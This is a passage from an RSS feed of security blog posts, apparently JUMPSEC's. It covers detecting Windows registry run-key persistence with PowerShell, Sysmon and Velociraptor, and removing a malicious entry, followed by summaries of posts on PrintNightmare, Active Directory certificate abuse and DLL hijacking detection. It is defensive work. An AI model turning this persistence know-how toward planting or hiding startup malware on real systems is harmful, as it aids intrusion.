class=&#34;s2&#34;&gt;&amp;#34;HKCU:\Software\Microsoft\Windows\CurrentVersion\RunOnce&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;foreach&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$item&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$items&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;nb&#34;&gt;write-host&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;----Reg location is &lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$item&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;----&amp;#34;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-ForegroundColor&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Magenta&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;nb&#34;&gt;get-itemproperty&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-path&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$item&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;  &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;select &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;-property&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-exclude&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;PS&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;fl
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;&lt;img src=&#34;images/2021-07-28_09-22.png&#34; alt=&#34;2021 07 28 09 22&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;And if we look hard enough, &lt;strong&gt;we identify something abnormal&lt;/strong&gt;. Once we take the executable and reverse engineer it, we can determine it is a malicious executable from the adversary. &lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;images/2021-07-28_17-42-1024x315.png&#34; alt=&#34;2021 07 28 17 42&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;If you identify a malicious run key, you are of course obliged to remove it from the machine. Let’s discuss how in a moment, &lt;strong&gt;after we discuss what this evil looks like from a SIEM / SOC perspective.&lt;/strong&gt;&lt;/p&gt;
&lt;h2&gt;Monitoring for Evil&lt;span class=&#34;absolute -mt-20&#34; id=&#34;monitoring-for-evil&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#monitoring-for-evil&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;Let’s discuss what this looks like from a detection and monitoring perspective.&lt;/strong&gt; &lt;/p&gt;
&lt;p&gt;For our example, we are using the built-in &lt;strong&gt;Windows Event Viewer&lt;/strong&gt;, and then adding &lt;a href=&#34;https://docs.microsoft.com/en-us/sysinternals/downloads/sysmon#:~:text=System%20Monitor%20%5c%28Sysmon%5c%29%20is%20a,changes%20to%20file%20creation%20time.&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;&lt;strong&gt;Sysmon&lt;/strong&gt;&lt;/a&gt; and &lt;a href=&#34;https://github.com/Neo23x0/sysmon-config&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;&lt;strong&gt;Florian&lt;/strong&gt; &lt;strong&gt;Roth’s&lt;/strong&gt;&lt;/a&gt; config of rules for detection. You could then feed this sysmon log data into a SIEM, and monitor hundreds of thousands of endpoints for run key malice (and other stuff too).&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;images/2021-07-28_18-15.png&#34; alt=&#34;2021 07 28 18 15&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;There is a wealth of information here worth considering: &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;The &lt;strong&gt;BLUE&lt;/strong&gt; arrows: event info&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;The &lt;strong&gt;Event ID 13 involves registry values&lt;/strong&gt; &lt;strong&gt;modification&lt;/strong&gt;, and this ID will be consistent in any environment. &lt;/li&gt;
&lt;li&gt;The &lt;strong&gt;EventType&lt;/strong&gt; and &lt;strong&gt;Task Category&lt;/strong&gt; spell out exactly what is happening here too: &lt;strong&gt;a registry value is being set&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;The &lt;strong&gt;RED&lt;/strong&gt; arrows**:** specific info&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;The &lt;strong&gt;TargetObject&lt;/strong&gt; shows the &lt;strong&gt;full path&lt;/strong&gt; for the run key registry we are changing. It also shows the &lt;strong&gt;name&lt;/strong&gt; we called it, and includes the special character that modifies the behaviour&lt;/li&gt;
&lt;li&gt;The &lt;strong&gt;Details&lt;/strong&gt; section shows the command / executable the run key is forced to run&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;The &lt;strong&gt;PINK&lt;/strong&gt; arrow: MITRE ATT&amp;amp;CK reference&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;This may not be in every sysmon config. However &lt;strong&gt;Florian Roth&lt;/strong&gt; includes the MITRE ATT&amp;amp;CK tactic number in a particular event.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;Rather than get attack alerts for every Event 13, I’d recommend you go on a bit of a discovery exercise of what the run keys in your environment normally do.&lt;/strong&gt;  &lt;/p&gt;
&lt;p&gt;Across the entire enterprise do they have the same consistent contents? &lt;/p&gt;
&lt;p&gt;Or does the finance department run software that legitimately alters the run key? &lt;/p&gt;
&lt;p&gt;Would you be able to baseline this and then create a small alert for any new, inconsistent run key changes to a workstation in the finance department?&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;This has greater value than hoping to catch one rogue Event 13 out of a million.&lt;/strong&gt;&lt;/p&gt;&lt;/blockquote&gt;
&lt;h3&gt;Interactive detection&lt;span class=&#34;absolute -mt-20&#34; id=&#34;interactive-detection&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#interactive-detection&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;If you want a more interactive detection experience, might I recommend a tool like &lt;a href=&#34;https://docs.velociraptor.app/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;&lt;strong&gt;Dr Michael Cohen’s Velociraptor?&lt;/strong&gt;&lt;/a&gt;. &lt;/p&gt;
&lt;p&gt;Velocitaptor is a tool (and philosophy) that deserves its own article, so I will be brief here. Velociraptor is an endpoint response agent that you can install on every single endpoint across your enterprise, and orchestrate from one server via a web-app. This distributed tool allows us to then query thousands of machines at once. &lt;/p&gt;
&lt;p&gt;Built in to Velociraptor is a hunt that queries every Windows machine specifically for their startup process, and part of this hunt includes &lt;a href=&#34;https://github.com/Velocidex/velociraptor/blob/master/artifacts/definitions/Windows/Sys/StartupItems.yaml&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;&lt;strong&gt;querying run keys&lt;/strong&gt;&lt;/a&gt;&lt;strong&gt;.&lt;/strong&gt;  As you can see, this hunt targets a number of the registry run keys that our previous PowerShell query also hunted for. Velociraptor targets an additional few run keys, as well as some other startup locations (but I leave that to you to investigate this all further).&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;images/2021-08-02_10-30-1024x519.png&#34; alt=&#34;2021 08 02 10 30&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;If we fire off this startup detection hunt, we will be given a beautifully formatted table of results. In real production environments, you will find more noise than this so be warned! But look at what we detected - a single machine in our domain currently running &lt;strong&gt;C:\evil.exe&lt;/strong&gt;, shocking stuff. &lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;images/2021-08-02_10-18-1024x665.png&#34; alt=&#34;2021 08 02 10 18&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Fortunately now we know and can eradicate it from the host - I’ll show you how.&lt;/strong&gt; &lt;/p&gt;
&lt;h2&gt;Eradicating Run Key Evil&lt;span class=&#34;absolute -mt-20&#34; id=&#34;eradicating-run-key-evil&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#eradicating-run-key-evil&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;It’s time. &lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;images/showtime.png&#34; alt=&#34;showtime&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Be surgical here.&lt;/strong&gt; If you aren’t precise in your commands, you will &lt;strong&gt;accidentally remove&lt;/strong&gt; run key entries that are &lt;strong&gt;legitimate&lt;/strong&gt;.  It&amp;rsquo;s important you remove with &lt;strong&gt;-verbose&lt;/strong&gt; too and double-check it has gone, to make sure you have removed what you think you have. &lt;/p&gt;
&lt;p&gt;Off the back of our PowerShell for loop, copy and paste the &lt;strong&gt;full path&lt;/strong&gt; location that the evil was detected. And double check this is where the malicious run key resides.&lt;/p&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;Get-ItemProperty&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce&amp;#34;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;select &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;-property&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-exclude&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;PS&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;*|&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;fl&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;&lt;img src=&#34;images/2021-07-28_19-07-1024x276.png&#34; alt=&#34;2021 07 28 19 07&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Then pick the EXACT name of the run key entry you want to remove. Copy paste it, include any special characters too please. &lt;strong&gt;Don’t copy&lt;/strong&gt; the executable details that come &lt;strong&gt;after the colon&lt;/strong&gt; ( : )&lt;/p&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;Remove-ItemProperty&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-Path&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce&amp;#34;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-Name&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;*Run Safe Mode too&amp;#34;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-verbose&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;&lt;img src=&#34;images/2021-07-28_19-11-1024x202.png&#34; alt=&#34;2021 07 28 19 11&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;We get our verbose message returned to us confirming that we are indeed removing the run key we think we are.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;images/2021-07-28_19-12-1024x127.png&#34; alt=&#34;2021 07 28 19 12&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Then check again to be sure it&amp;rsquo;s gone. If you still have the malicious run key here, double check you have copied and pasted appropriately, as fat-fingering paths and registry names are very real problems.&lt;/p&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;Get-ItemProperty&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce&amp;#34;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;select &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;-property&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-exclude&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;PS&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;*|&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;fl&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;&lt;img src=&#34;images/empty-1024x124.png&#34; alt=&#34;empty&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;h1&gt;Unpicking Run Keys&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;Run keys are obscure mechanisms of persistence for sure. But I hope this article has instilled confidence in how straightforward it is to monitor, detect, control, and remove any malicious activity involving your run keys.&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;As a defender, sometimes our roles are framed as being consistently at a disadvantage compared to the adversary. They can leverage zero-days, they can trick users, they can run across time zones with bigger budgets. &lt;strong&gt;Whilst we must consistently be at the top of our game, they only need to be lucky once.&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;All of this is true, but I find that sometimes we could invert this framing to focus on the advantages we possess compared to the attacker.&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;This is &lt;strong&gt;OUR&lt;/strong&gt; environment. This is &lt;strong&gt;OUR&lt;/strong&gt; registry. And these are &lt;strong&gt;OUR&lt;/strong&gt; run keys. We know how it all works, and we should be here waiting for the adversary to so much as sneeze in our domain without us knowing about it. Sure, have a foothold. But we aren’t naive, we expect compromise. And we will catch you, kick you out, and ensure your future attempts at re-entry are that bit harder. &lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;images/sparta-1024x577.jpg&#34; alt=&#34;sparta&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Understand what is normal for your environment so you know when a registry run key manipulation is out of place, and foster a hostile network so an adversary can’t move an inch without you knowing about it and containing them.&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;There’s a lot to do and never enough time or resource to do it, but that’s why we’re in infosec right? &lt;/p&gt;
&lt;h2&gt;Some Bedside Reading&lt;span class=&#34;absolute -mt-20&#34; id=&#34;some-bedside-reading&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#some-bedside-reading&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;There are so many other janky registry entries that can do weird things with run keys. We didn’t mention, for example, how entire folders can become mechanisms of persistence via registry run keys! You can read more &lt;a href=&#34;https://www.picussecurity.com/resource/blog/picus-10-critical-mitre-attck-techniques-t1060-registry-run-keys-startup-folder&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;&lt;strong&gt;here&lt;/strong&gt;&lt;/a&gt;, &lt;a href=&#34;https://dmcxblue.gitbook.io/red-team-notes/persistence/registry-keys-startup-folder&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;&lt;strong&gt;here&lt;/strong&gt;&lt;/a&gt;, and &lt;a href=&#34;https://attack.mitre.org/techniques/T1547/001/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;&lt;strong&gt;here&lt;/strong&gt;&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;If you enjoyed this article or especially if you DIDN’T enjoy this article, give these other ones a go: looking at &lt;a href=&#34;https://labs.jumpsec.com/car-hacking-manual-bypass-of-modern-rolling-code-implementations/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;&lt;strong&gt;hacking cars&lt;/strong&gt;&lt;/a&gt; and breaking their keyfob encryption; evaluating the potential &lt;a href=&#34;https://labs.jumpsec.com/can-depix-deobfuscate-your-data/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;&lt;strong&gt;de-obfuscate redacted text&lt;/strong&gt;&lt;/a&gt; in sensitive documents; and advanced techniques to defend your &lt;a href=&#34;https://labs.jumpsec.com/obfuscating-c2-during-a-red-team-engagement/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;&lt;strong&gt;C2&amp;rsquo;s&lt;/strong&gt;&lt;/a&gt; honour.&lt;/p&gt;
&lt;p&gt;Any questions, comments, or criticisms please drop me a line&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;a href=&#34;https://twitter.com/Purp1eW0lf&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;Twitter&lt;/a&gt; &lt;a href=&#34;https://github.com/Purp1eW0lf/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;Github&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Dray Agha,&lt;/strong&gt; Security Researcher&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;images/2021-08-10_21-10.png&#34; alt=&#34;2021 08 10 21 10&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;

      </description>
    </item>
    
    <item>
      <title>PRINTNIGHTMARE NETWORK ANALYSIS</title>
      <link>//localhost:1313/articles/2021/07/2021-07-07-printnightmare-network-analysis/</link>
      <pubDate>Wed, 07 Jul 2021 00:00:00 +0000</pubDate>
      
      <guid>//localhost:1313/articles/2021/07/2021-07-07-printnightmare-network-analysis/</guid>
      <description>
        
        
        &lt;p&gt;By &lt;a href=&#34;https://twitter.com/Purp1eW0lf&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;Dray Agha&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;The infosec community has been busy dissecting the &lt;strong&gt;PrintNightmare exploit&lt;/strong&gt;. There are now &lt;strong&gt;variations of the exploit&lt;/strong&gt; that can have &lt;strong&gt;various impacts&lt;/strong&gt; on a target machine.&lt;/p&gt;
&lt;p&gt;When we at JUMPSEC saw that &lt;a href=&#34;https://github.com/LaresLLC/CVE-2021-1675/blob/main/zeek/PrintNightmare.pcap&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;Lares&lt;/a&gt; had captured some network traffic of the PrintNightmare exploit in action, I wondered if there was an opportunity &lt;strong&gt;to gather network-level IoCs and processes&lt;/strong&gt; that could offer defenders &lt;strong&gt;unique but consistent methods of detection across the various exploits.&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;In this blog, I leverage &lt;strong&gt;Tshark&lt;/strong&gt; and see if it can reveal anything about the &lt;strong&gt;networking side&lt;/strong&gt; of the &lt;strong&gt;PrintNightmare&lt;/strong&gt; exploit. Our goal is purely exploratory, investigating the general workings and network activity of this exploit under the hood. &lt;strong&gt;&lt;a href=&#34;https://labs.jumpsec.com/printnightmare-network-analysis/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;Read More&amp;hellip;&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Written by: Dray Agha, Security Researcher&lt;/p&gt;

      </description>
    </item>
    
    <item>
      <title>Securing against new offensive techniques abusing active directory certificate service</title>
      <link>//localhost:1313/articles/2021/07/2021-07-06-securing-against-new-offensive-techniques-abusing-active-directory-certificate-service/</link>
      <pubDate>Tue, 06 Jul 2021 00:00:00 +0000</pubDate>
      
      <guid>//localhost:1313/articles/2021/07/2021-07-06-securing-against-new-offensive-techniques-abusing-active-directory-certificate-service/</guid>
      <description>
        
        
        &lt;p&gt;SpecterOps recently released an offensive security research paper that details techniques enabling an adversary to abuse insecure functionality in Active Directory Certificate Service.&lt;/p&gt;
&lt;p&gt;SpecterOps reports that abusing the legitimate functionality of Active Directory Certificate Service will allow an adversary to forge the elements of a certificate to authenticate as any user or administrator in Active Directory. JUMPSEC has highlighted numerous changes that can be made to Active Directory Certificate Service configuration to protect the domain through a defence-in-depth approach.&lt;/p&gt;
&lt;p&gt;We at JUMPSEC wanted to understand the defensive application of this offensive research to pre-emptively defend our clients from these techniques before exploitation is observed in the wild. To do this, we utilised our Active Directory lab and attempted to harden the service to reduce the risk of compromise and limit the ability for an attacker to cause harm.&lt;/p&gt;
&lt;p&gt;In this article, JUMPSEC has documented the most effective and efficient methods we took to implement the broad defensive guidance in SpecterOps research. In our attempts to harden Active Directory Certificate Service, we have identified ways to harden the environment against compromise, and leverage auditing toolkits to make it easier to identify and remediate areas of exposure.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;a href=&#34;https://labs.jumpsec.com/active-directory-certificate-service-defensive-guidance/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;Read here for technical extracts&lt;/a&gt;&lt;/strong&gt; or for the full technical guide &lt;a href=&#34;https://labs.jumpsec.com/wp-content/uploads/sites/2/2021/07/Active-Directory-Certificate-Service-Defensive-Guidance-v1.pdf&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;&lt;strong&gt;click here&lt;/strong&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Article written by Dray Agha, Security Researcher |&lt;/strong&gt; Any questions, comments, or criticisms please drop me a line on: &lt;a href=&#34;https://twitter.com/Purp1eW0lf&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;Twitter&lt;/a&gt;, &lt;a href=&#34;https://github.com/Purp1eW0lf/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;Github&lt;/a&gt;, or &lt;a href=&#34;mailto:dray.agha@jumpsec.com&#34; &gt;Email&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://labs.jumpsec.com/wp-content/uploads/sites/2/2021/07/Active-Directory-Certificate-Service-Defensive-Guidance-v1.pdf&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;&lt;img src=&#34;images/Defensive-Guidance-v1-1-pdf.jpg&#34; alt=&#34;Active Directory Certificate Service Defensive Guidance&#34; loading=&#34;lazy&#34; /&gt;&lt;/a&gt;&lt;/p&gt;

      </description>
    </item>
    
    <item>
      <title>Detecting known DLL hijacking and named pipe token impersonation attacks with Sysmon</title>
      <link>//localhost:1313/articles/2020/11/2020-11-13-detecting-known-dll-hijacking-and-named-pipe-token-impersonation-attacks-with-sysmon/</link>
      <pubDate>Fri, 13 Nov 2020 00:00:00 +0000</pubDate>
      
      <guid>//localhost:1313/articles/2020/11/2020-11-13-detecting-known-dll-hijacking-and-named-pipe-token-impersonation-attacks-with-sysmon/</guid>
      <description>
        
        
        &lt;p&gt;Background&lt;/p&gt;
&lt;p&gt;Recently we posted a bunch of &lt;a href=&#34;https://labs.jumpsec.com/tag/ivanti/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;advisories&lt;/a&gt; relating to Ivanti Unified Endpoint Manager, a couple of which are for vulnerabilities which can be used to achieve local privilege escalation.&lt;/p&gt;
&lt;p&gt;At JUMPSEC, whenever we find a new vulnerability, we like to challenge ourselves to write rules to detect it being exploited. We learn a lot doing this, it’s kind of fun tweaking the exploit to try and evade detection and really challenges us to write good detection rulesets.&lt;/p&gt;
&lt;p&gt;Naturally, with the right signatures you can detect future exploitation of an issue, but it’s also fun/scary (delete as appropriate!) to run this on historical data and find out if someone else got there first and the vulnerability has been exploited in the wild already…&lt;/p&gt;
&lt;p&gt;We enjoy doing it, we know it is valuable to our clients and we’d love to see more of it being done which is why we’re making an effort to share some detail relating to our recent Ivanti advisories.&lt;/p&gt;
&lt;p&gt;Introduction&lt;/p&gt;
&lt;p&gt;Because of the high number of components that make up an operating system, attackers with local access have a very wide array of possible ways to interact with the system in malicious ways, even when limited to low privileges. This corresponds to a greater effort required to properly monitor for suspicious behaviour and detect attacks.&lt;/p&gt;
